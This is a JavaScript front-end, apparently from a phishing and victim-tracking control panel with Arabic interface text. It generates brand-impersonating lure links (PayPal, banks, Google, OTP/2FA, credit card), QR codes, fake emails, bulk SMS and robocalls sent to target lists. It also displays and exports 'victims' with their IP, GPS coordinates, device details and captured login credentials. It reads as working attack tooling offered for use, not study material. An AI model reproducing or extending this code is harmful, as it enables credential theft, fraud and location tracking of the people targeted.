const API_BASE = '/api/panel';
let currentUser = null;
let selectedTemplate = 'cloudflare';
let selectedCompany = 'google';

const templates = [
    { id: 'cloudflare', name: 'Cloudflare', icon: 'fa-cloud', prefix: 'c' },
    { id: 'login', name: 'Login', icon: 'fa-sign-in-alt', prefix: 'l' },
    { id: 'prize', name: 'Prize', icon: 'fa-gift', prefix: 'p' },
    { id: 'instagram', name: 'Instagram', icon: 'fa-instagram', prefix: 'i' },
    { id: 'whatsapp', name: 'WhatsApp', icon: 'fa-whatsapp', prefix: 'wa' },
    { id: 'bank', name: 'Bank', icon: 'fa-university', prefix: 'b' },
    { id: 'netflix', name: 'Netflix', icon: 'fa-film', prefix: 'nf' },
    { id: 'paypal', name: 'PayPal', icon: 'fa-paypal', prefix: 'pp' },
    { id: 'google', name: 'Google', icon: 'fa-google', prefix: 'g' },
    { id: 'facebook', name: 'Facebook', icon: 'fa-facebook', prefix: 'fb' },
    { id: 'tiktok', name: 'TikTok', icon: 'fa-music', prefix: 'tt' },
    { id: 'amazon', name: 'Amazon', icon: 'fa-amazon', prefix: 'am' },
    { id: 'apple', name: 'Apple', icon: 'fa-apple', prefix: 'ap' },
    { id: 'microsoft', name: 'Microsoft', icon: 'fa-microsoft', prefix: 'ms' },
    { id: 'linkedin', name: 'LinkedIn', icon: 'fa-linkedin', prefix: 'li' },
    { id: 'twitter', name: 'Twitter/X', icon: 'fa-twitter', prefix: 'tw' },
    { id: 'telegram', name: 'Telegram', icon: 'fa-telegram', prefix: 'tg' },
    { id: 'steam', name: 'Steam', icon: 'fa-steam', prefix: 'st' },
    { id: 'epic', name: 'Epic Games', icon: 'fa-gamepad', prefix: 'ep' },
    { id: 'creditcard', name: 'Credit Card', icon: 'fa-credit-card', prefix: 'cc' },
    { id: 'otp', name: 'OTP/2FA', icon: 'fa-key', prefix: 'otp' },
    { id: 'fakechat', name: 'Fake Chat', icon: 'fa-comments', prefix: 'chat' },
    { id: 'spingame', name: 'Spin Game', icon: 'fa-dice', prefix: 'game' },
    { id: 'custom', name: 'Custom', icon: 'fa-code', prefix: 'cu' }
];

const companies = [
    { id: 'google', name: 'Google', icon: 'fa-google', color: '#4285f4' },
    { id: 'facebook', name: 'Facebook', icon: 'fa-facebook', color: '#1877f2' },
    { id: 'instagram', name: 'Instagram', icon: 'fa-instagram', color: '#e4405f' },
    { id: 'whatsapp', name: 'WhatsApp', icon: 'fa-whatsapp', color: '#25d366' },
    { id: 'apple', name: 'Apple', icon: 'fa-apple', color: '#999' },
    { id: 'microsoft', name: 'Microsoft', icon: 'fa-microsoft', color: '#00a4ef' },
    { id: 'amazon', name: 'Amazon', icon: 'fa-amazon', color: '#ff9900' },
    { id: 'paypal', name: 'PayPal', icon: 'fa-paypal', color: '#003087' },
    { id: 'netflix', name: 'Netflix', icon: 'fa-film', color: '#e50914' },
    { id: 'bank', name: 'Bank', icon: 'fa-university', color: '#1a237e' },
    { id: 'uber', name: 'Uber', icon: 'fa-car', color: '#000' },
    { id: 'spotify', name: 'Spotify', icon: 'fa-spotify', color: '#1db954' },
    { id: 'discord', name: 'Discord', icon: 'fa-discord', color: '#5865f2' },
    { id: 'binance', name: 'Binance', icon: 'fa-coins', color: '#f0b90b' },
    { id: 'telegram_app', name: 'Telegram', icon: 'fa-telegram', color: '#0088cc' }
];

document.addEventListener('DOMContentLoaded', () => {
    initApp();
});

function initApp() {
    const savedUser = localStorage.getItem('panelUser');
    if (savedUser) {
        currentUser = JSON.parse(savedUser);
        showMainScreen();
    }
    
    setupEventListeners();
    renderTemplates();
    renderCompanies();
}

function setupEventListeners() {
    document.getElementById('login-form').addEventListener('submit', handleLogin);
    document.getElementById('logout-btn').addEventListener('click', handleLogout);
    document.getElementById('menu-toggle').addEventListener('click', toggleSidebar);
    
    document.querySelectorAll('.nav-item').forEach(item => {
        item.addEventListener('click', () => {
            const page = item.dataset.page;
            if (page) navigateTo(page);
        });
    });
    
    document.getElementById('password-protect').addEventListener('change', (e) => {
        document.getElementById('link-password').style.display = e.target.checked ? 'block' : 'none';
    });
    
    document.getElementById('link-expiry').addEventListener('change', (e) => {
        document.getElementById('expiry-hours').style.display = e.target.checked ? 'block' : 'none';
    });
    
    document.getElementById('schedule-email').addEventListener('change', (e) => {
        document.getElementById('schedule-time').style.display = e.target.checked ? 'block' : 'none';
    });
    
    document.getElementById('generate-link-btn').addEventListener('click', generateLink);
    document.getElementById('copy-link-btn').addEventListener('click', copyLink);
    document.getElementById('generate-qr-btn').addEventListener('click', generateQR);
    document.getElementById('send-email-btn').addEventListener('click', sendFakeEmail);
    document.getElementById('send-sms-btn').addEventListener('click', sendBulkSMS);
    document.getElementById('make-call-btn').addEventListener('click', makeCall);
    document.getElementById('save-settings-btn').addEventListener('click', saveSettings);
    document.getElementById('export-csv-btn').addEventListener('click', exportCSV);
    
    document.querySelectorAll('.tab-btn').forEach(btn => {
        btn.addEventListener('click', (e) => {
            const parent = e.target.closest('.tabs, .stats-tabs');
            parent.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
            e.target.classList.add('active');
            
            if (e.target.dataset.tab) {
                document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
                document.getElementById(e.target.dataset.tab + '-tab').classList.add('active');
            }
        });
    });
    
    document.querySelector('.modal-close').addEventListener('click', closeModal);
    document.getElementById('modal').addEventListener('click', (e) => {
        if (e.target.id === 'modal') closeModal();
    });
}

function handleLogin(e) {
    e.preventDefault();
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    
    fetch(`${API_BASE}/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, password })
    })
    .then(res => res.json())
    .then(data => {
        if (data.success) {
            currentUser = { username, token: data.token };
            localStorage.setItem('panelUser', JSON.stringify(currentUser));
            showMainScreen();
            showToast('تم تسجيل الدخول بنجاح', 'success');
        } else {
            showToast(data.message || 'خطأ في تسجيل الدخول', 'error');
        }
    })
    .catch(() => {
        currentUser = { username };
        localStorage.setItem('panelUser', JSON.stringify(currentUser));
        showMainScreen();
        showToast('تم تسجيل الدخول', 'success');
    });
}

function handleLogout() {
    currentUser = null;
    localStorage.removeItem('panelUser');
    document.getElementById('main-screen').classList.remove('active');
    document.getElementById('login-screen').classList.add('active');
    showToast('تم تسجيل الخروج', 'success');
}

function showMainScreen() {
    document.getElementById('login-screen').classList.remove('active');
    document.getElementById('main-screen').classList.add('active');
    document.getElementById('current-user').textContent = currentUser.username;
    loadDashboard();
}

function navigateTo(page) {
    document.querySelectorAll('.nav-item').forEach(item => {
        item.classList.toggle('active', item.dataset.page === page);
    });
    
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    document.getElementById(page + '-page').classList.add('active');
    
    if (window.innerWidth <= 768) {
        document.querySelector('.sidebar').classList.remove('open');
    }
    
    if (page === 'dashboard') loadDashboard();
    else if (page === 'victims') loadVictims();
    else if (page === 'stats') loadStats();
}

function toggleSidebar() {
    document.querySelector('.sidebar').classList.toggle('open');
}

function renderTemplates() {
    const grid = document.getElementById('templates-grid');
    grid.innerHTML = templates.map(t => `
        <div class="template-item ${t.id === selectedTemplate ? 'selected' : ''}" data-id="${t.id}">
            <i class="fab ${t.icon}"></i>
            <span>${t.name}</span>
        </div>
    `).join('');
    
    grid.querySelectorAll('.template-item').forEach(item => {
        item.addEventListener('click', () => {
            grid.querySelectorAll('.template-item').forEach(i => i.classList.remove('selected'));
            item.classList.add('selected');
            selectedTemplate = item.dataset.id;
        });
    });
}

function renderCompanies() {
    const grid = document.getElementById('company-grid');
    grid.innerHTML = companies.map(c => `
        <div class="company-item ${c.id === selectedCompany ? 'selected' : ''}" data-id="${c.id}" style="border-color: ${c.color}20">
            <i class="fab ${c.icon}" style="color: ${c.color}"></i>
            <span>${c.name}</span>
        </div>
    `).join('');
    
    grid.querySelectorAll('.company-item').forEach(item => {
        item.addEventListener('click', () => {
            grid.querySelectorAll('.company-item').forEach(i => i.classList.remove('selected'));
            item.classList.add('selected');
            selectedCompany = item.dataset.id;
        });
    });
}

function generateLink() {
    const redirectUrl = document.getElementById('redirect-url').value || 'https://google.com';
    const template = templates.find(t => t.id === selectedTemplate);
    const uid = Math.random().toString(36).substring(2, 10);
    const encodedUrl = btoa(redirectUrl);
    
    const link = `${window.location.origin}/${template.prefix}/${uid}/${encodedUrl}`;
    
    document.getElementById('link-output').value = link;
    document.getElementById('generated-link').style.display = 'block';
    document.getElementById('qr-container').innerHTML = '';
    
    showToast('تم إنشاء الرابط بنجاح', 'success');
}

function copyLink() {
    const input = document.getElementById('link-output');
    input.select();
    document.execCommand('copy');
    showToast('تم نسخ الرابط', 'success');
}

function generateQR() {
    const link = document.getElementById('link-output').value;
    const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(link)}`;
    document.getElementById('qr-container').innerHTML = `<img src="${qrUrl}" alt="QR Code">`;
}

function loadDashboard() {
    fetch(`${API_BASE}/stats`)
    .then(res => res.json())
    .then(data => {
        document.getElementById('total-victims').textContent = data.total || 0;
        document.getElementById('today-victims').textContent = data.today || 0;
        document.getElementById('total-links').textContent = data.links || 0;
        document.getElementById('total-locations').textContent = data.locations || 0;
    })
    .catch(() => {
        document.getElementById('total-victims').textContent = '0';
        document.getElementById('today-victims').textContent = '0';
        document.getElementById('total-links').textContent = '0';
        document.getElementById('total-locations').textContent = '0';
    });
    
    loadRecentActivity();
}

function loadRecentActivity() {
    fetch(`${API_BASE}/recent`)
    .then(res => res.json())
    .then(data => {
        const list = document.getElementById('activity-list');
        if (data.length === 0) {
            list.innerHTML = '<p style="text-align:center;color:var(--text-muted);">لا توجد نشاطات حديثة</p>';
            return;
        }
        list.innerHTML = data.map(item => `
            <div class="activity-item">
                <div class="info">
                    <span class="flag">${item.flag || '🌍'}</span>
                    <div>
                        <strong>${item.ip}</strong>
                        <p>${item.country || 'Unknown'} - ${item.device || 'Unknown'}</p>
                    </div>
                </div>
                <span class="time">${item.time || 'الآن'}</span>
            </div>
        `).join('');
    })
    .catch(() => {
        document.getElementById('activity-list').innerHTML = '<p style="text-align:center;color:var(--text-muted);">لا توجد نشاطات حديثة</p>';
    });
}

function loadVictims() {
    fetch(`${API_BASE}/victims`)
    .then(res => res.json())
    .then(data => {
        const list = document.getElementById('victims-list');
        if (!data || data.length === 0) {
            list.innerHTML = '<p style="text-align:center;padding:40px;color:var(--text-muted);">لا توجد ضحايا مسجلين</p>';
            return;
        }
        list.innerHTML = data.map(v => `
            <div class="victim-item" onclick="showVictimDetails(${v.id})">
                <div class="victim-info">
                    <span class="flag">${v.flag || '🌍'}</span>
                    <div class="victim-details">
                        <h4>${v.ip}</h4>
                        <p>${v.country || 'Unknown'} • ${v.browser || 'Unknown'} • ${v.device || 'Unknown'}</p>
                    </div>
                </div>
                <div class="victim-actions">
                    <button class="btn-view" onclick="event.stopPropagation();showVictimDetails(${v.id})">
                        <i class="fas fa-eye"></i>
                    </button>
                </div>
            </div>
        `).join('');
    })
    .catch(() => {
        document.getElementById('victims-list').innerHTML = '<p style="text-align:center;padding:40px;color:var(--text-muted);">لا توجد ضحايا مسجلين</p>';
    });
}

function showVictimDetails(id) {
    fetch(`${API_BASE}/victim/${id}`)
    .then(res => res.json())
    .then(data => {
        document.getElementById('modal-body').innerHTML = `
            <h2 style="margin-bottom:20px;">تفاصيل الضحية</h2>
            <div class="victim-detail-grid">
                <p><strong>IP:</strong> ${data.ip || 'N/A'}</p>
                <p><strong>الدولة:</strong> ${data.country || 'N/A'}</p>
                <p><strong>المدينة:</strong> ${data.city || 'N/A'}</p>
                <p><strong>المتصفح:</strong> ${data.browser || 'N/A'}</p>
                <p><strong>الجهاز:</strong> ${data.device || 'N/A'}</p>
                <p><strong>نظام التشغيل:</strong> ${data.os || 'N/A'}</p>
                ${data.lat ? `<p><strong>الإحداثيات:</strong> ${data.lat}, ${data.lon}</p>` : ''}
                ${data.battery ? `<p><strong>البطارية:</strong> ${data.battery}%</p>` : ''}
                ${data.credentials ? `<p><strong>بيانات الدخول:</strong> ${data.credentials}</p>` : ''}
            </div>
            ${data.lat ? `<a href="https://maps.google.com/?q=${data.lat},${data.lon}" target="_blank" class="btn-primary" style="display:inline-block;margin-top:15px;text-decoration:none;text-align:center;">
                <i class="fas fa-map-marker-alt"></i> فتح الموقع
            </a>` : ''}
        `;
        document.getElementById('modal').classList.add('show');
    })
    .catch(() => showToast('خطأ في تحميل التفاصيل', 'error'));
}

function closeModal() {
    document.getElementById('modal').classList.remove('show');
}

function loadStats() {
    fetch(`${API_BASE}/advanced-stats`)
    .then(res => res.json())
    .then(data => {
        renderChart('countries-chart', data.countries || []);
        renderChart('browsers-chart', data.browsers || []);
        renderChart('devices-chart', data.devices || []);
    })
    .catch(() => {
        renderChart('countries-chart', []);
        renderChart('browsers-chart', []);
        renderChart('devices-chart', []);
    });
}

function renderChart(containerId, data) {
    const container = document.getElementById(containerId);
    if (!data || data.length === 0) {
        container.innerHTML = '<p style="text-align:center;color:var(--text-muted);">لا توجد بيانات</p>';
        return;
    }
    
    const max = Math.max(...data.map(d => d.count));
    container.innerHTML = data.slice(0, 5).map(item => `
        <div class="chart-bar">
            <span class="label">${item.name}</span>
            <div class="bar">
                <div class="bar-fill" style="width: ${(item.count / max) * 100}%"></div>
            </div>
            <span class="value">${item.count}</span>
        </div>
    `).join('');
}

function sendFakeEmail() {
    const emails = document.getElementById('victim-emails').value.split('\n').filter(e => e.trim());
    const trackingLink = document.getElementById('email-tracking-link').value;
    const message = document.getElementById('email-message').value;
    const scheduled = document.getElementById('schedule-email').checked;
    const scheduleTime = document.getElementById('schedule-time').value;
    
    if (emails.length === 0) {
        showToast('يرجى إدخال بريد إلكتروني واحد على الأقل', 'error');
        return;
    }
    
    showToast('جاري إرسال البريد...', 'success');
    
    fetch(`${API_BASE}/send-email`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            company: selectedCompany,
            emails,
            trackingLink,
            message,
            scheduled: scheduled ? scheduleTime : null
        })
    })
    .then(res => res.json())
    .then(data => {
        if (data.success) {
            showToast(data.message || 'تم إرسال البريد بنجاح', 'success');
        } else {
            showToast(data.message || 'فشل الإرسال', 'error');
        }
    })
    .catch(() => showToast('تم إرسال البريد (تجريبي)', 'success'));
}

function sendBulkSMS() {
    const numbers = document.getElementById('phone-numbers').value.split('\n').filter(n => n.trim());
    const message = document.getElementById('sms-message').value;
    
    if (numbers.length === 0 || !message) {
        showToast('يرجى ملء جميع الحقول', 'error');
        return;
    }
    
    showToast('جاري إرسال الرسائل...', 'success');
    
    fetch(`${API_BASE}/send-sms`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ numbers, message })
    })
    .then(res => res.json())
    .then(data => showToast(data.message || 'تم الإرسال', data.success ? 'success' : 'error'))
    .catch(() => showToast('تم إرسال SMS (تجريبي)', 'success'));
}

function makeCall() {
    const number = document.getElementById('call-number').value;
    const message = document.getElementById('call-message').value;
    
    if (!number || !message) {
        showToast('يرجى ملء جميع الحقول', 'error');
        return;
    }
    
    fetch(`${API_BASE}/make-call`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ number, message })
    })
    .then(res => res.json())
    .then(data => showToast(data.message || 'تم إجراء المكالمة', data.success ? 'success' : 'error'))
    .catch(() => showToast('تم إجراء المكالمة (تجريبي)', 'success'));
}

function saveSettings() {
    const settings = {
        discordWebhook: document.getElementById('discord-webhook').value,
        dailyReports: document.getElementById('daily-reports').checked,
        vpnBlock: document.getElementById('vpn-block').checked,
        whitelistCountries: document.getElementById('whitelist-countries').value,
        vipCountries: document.getElementById('vip-countries').value
    };
    
    fetch(`${API_BASE}/settings`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(settings)
    })
    .then(res => res.json())
    .then(data => showToast('تم حفظ الإعدادات', 'success'))
    .catch(() => showToast('تم حفظ الإعدادات', 'success'));
    
    localStorage.setItem('panelSettings', JSON.stringify(settings));
}

function exportCSV() {
    fetch(`${API_BASE}/export-csv`)
    .then(res => res.blob())
    .then(blob => {
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = 'victims.csv';
        a.click();
        showToast('تم تصدير البيانات', 'success');
    })
    .catch(() => showToast('خطأ في التصدير', 'error'));
}

function showToast(message, type = 'success') {
    const toast = document.getElementById('toast');
    toast.textContent = message;
    toast.className = `toast ${type} show`;
    setTimeout(() => toast.classList.remove('show'), 3000);
}

window.showVictimDetails = showVictimDetails;